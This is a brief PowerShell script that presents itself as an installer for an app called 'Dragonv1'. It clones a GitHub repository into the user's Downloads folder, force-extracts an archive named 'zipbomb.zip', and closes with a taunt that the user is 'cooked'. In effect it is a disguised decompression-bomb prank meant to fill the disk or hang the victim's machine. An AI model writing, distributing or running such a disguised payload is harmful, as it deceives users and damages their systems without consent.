Write-Host "Installing Dragonv1... by DRAGON, an application that's cool as hell"

# Go to Downloads
Set-Location "$HOME\Downloads"

# Clone the repository into Downloads
git clone https://github.com/12hrformat/dragonv1

# Enter the cloned folder
Set-Location ".\dragonv1"

# Extract the ZIP into the current directory
Expand-Archive -Path ".\zipbomb.zip" -DestinationPath "." -Force

Write-Host "Done! youre cooked lil bro"
